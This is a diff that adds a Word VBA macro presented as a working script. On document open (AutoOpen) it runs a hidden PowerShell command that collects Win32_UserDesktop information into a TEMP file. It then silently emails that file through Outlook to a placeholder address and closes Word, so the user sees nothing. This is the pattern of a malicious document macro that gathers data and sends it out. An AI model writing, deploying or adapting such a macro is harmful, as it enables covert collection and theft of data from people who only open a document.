@@ -1,0 +1,27 @@
+VBA Script Works, closes word after it completes.
+
+Sub AutoOpen()
+    Dim shell, exec, outlook, mail, attachment
+    Set shell = CreateObject("WScript.Shell")
+    Set exec = shell.Exec("powershell.exe -WindowStyle Hidden -Command ""Get-CimInstance -ClassName Win32_UserDesktop | Format-Table -AutoSize | Out-String -Stream | Out-File -FilePath $env:TEMP\Win32_UserDesktop.txt""")
+    Do While exec.Status = 0
+        ' Wait for PowerShell command to finish
+    Loop
+    If exec.ExitCode = 0 Then
+        ' PowerShell command succeeded, send email with attachment
+        Set outlook = CreateObject("Outlook.Application")
+        Set mail = outlook.CreateItem(0)
+        mail.To = "Add-Recipient-Email-Address"
+        mail.Subject = "Win32_UserDesktop"
+        mail.Body = "Please find attached the results of the Win32_UserDesktop query."
+        Set attachment = mail.Attachments.Add(shell.ExpandEnvironmentStrings("%TEMP%") & "\Win32_UserDesktop.txt")
+        mail.Send
+        Set attachment = Nothing
+        Set mail = Nothing
+        Set outlook = Nothing
+        Application.Quit
+    Else
+        ' PowerShell command failed, show error message
+        MsgBox "Error: PowerShell command failed with exit code " & exec.ExitCode
+    End If
+End Sub
